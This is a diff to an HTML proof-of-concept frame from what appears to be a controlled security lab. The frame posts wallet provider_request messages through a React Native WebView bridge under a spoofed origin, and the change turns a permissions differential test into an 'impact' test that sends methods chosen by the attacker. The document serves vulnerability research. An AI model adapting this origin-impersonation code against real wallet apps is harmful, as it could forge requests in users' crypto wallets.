@@ -2,7 +2,7 @@
 <html lang="en">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Core strict validator Origin B</title>
+<title>Controlled Origin B impact frame</title>
 <body style="font:14px/1.4 system-ui;margin:12px">
 <strong>Controlled Origin B</strong>
 <pre id="log"></pre>
@@ -15,12 +15,13 @@
   const session = query.get('session');
   const output = document.getElementById('log');
 
-  if (!topOrigin || !session) throw new Error('Missing controlled test parameters');
-  if (new URL(topOrigin).origin !== topOrigin) throw new Error('Invalid topOrigin');
+  if (!topOrigin || !session || new URL(topOrigin).origin !== topOrigin) {
+    throw new Error('Invalid controlled test parameters');
+  }
 
   function report(event, details = {}) {
     const message = {
-      lab: 'core-strict',
+      lab: 'core-impact',
       session,
       event,
       actualChildOrigin: location.origin,
@@ -32,23 +33,14 @@
     parent.postMessage(message, topOrigin);
   }
 
-  function nativePost(id, claimedOrigin) {
-    const message = JSON.stringify({
-      method: 'provider_request',
-      payload: JSON.stringify({
-        id,
-        origin: claimedOrigin,
-        request: { method: 'wallet_getPermissions', params: [] }
-      })
-    });
-
+  function nativePost(serialized) {
     if (window.ReactNativeWebView?.postMessage) {
-      window.ReactNativeWebView.postMessage(message);
+      window.ReactNativeWebView.postMessage(serialized);
       return 'window.ReactNativeWebView';
     }
     const ios = window.webkit?.messageHandlers?.ReactNativeWebView;
     if (ios?.postMessage) {
-      ios.postMessage(message);
+      ios.postMessage(serialized);
       return 'window.webkit.messageHandlers.ReactNativeWebView';
     }
     throw new Error('Native bridge is not exposed to Origin B');
@@ -57,29 +49,28 @@
   addEventListener('message', event => {
     if (event.source !== parent || event.origin !== topOrigin) return;
     const data = event.data;
-    if (!data || data.lab !== 'core-strict' || data.session !== session) return;
-    if (data.command !== 'RUN_DIFFERENTIAL') return;
+    if (!data || data.lab !== 'core-impact' || data.session !== session) return;
+    if (data.command !== 'COLLIDE_WITH_TOP_REQUEST') return;
 
     try {
-      const negativeBridge = nativePost(data.negativeId, location.origin);
-      report('NEGATIVE_CONTROL_POSTED', {
-        id: data.negativeId,
-        claimedOrigin: location.origin,
-        bridge: negativeBridge
+      if (!/^core_probe_[0-9a-f]{20}$/.test(data.nonceMethod)) {
+        throw new Error('Invalid nonce method');
+      }
+      const wrapper = JSON.stringify({
+        method: 'provider_request',
+        payload: JSON.stringify({
+          id: data.id,
+          origin: data.claimedOrigin,
+          request: { method: data.nonceMethod, params: [] }
+        })
       });
-
-      setTimeout(() => {
-        try {
-          const positiveBridge = nativePost(data.positiveId, data.topOrigin);
-          report('IMPERSONATION_REQUEST_POSTED', {
-            id: data.positiveId,
-            claimedOrigin: data.topOrigin,
-            bridge: positiveBridge
-          });
-        } catch (error) {
-          report('CHILD_ERROR', { message: String(error) });
-        }
-      }, 500);
+      const bridge = nativePost(wrapper);
+      report('ATTACKER_CHOSEN_METHOD_POSTED', {
+        id: data.id,
+        claimedOrigin: data.claimedOrigin,
+        nonceMethod: data.nonceMethod,
+        bridge
+      });
     } catch (error) {
       report('CHILD_ERROR', { message: String(error) });
     }
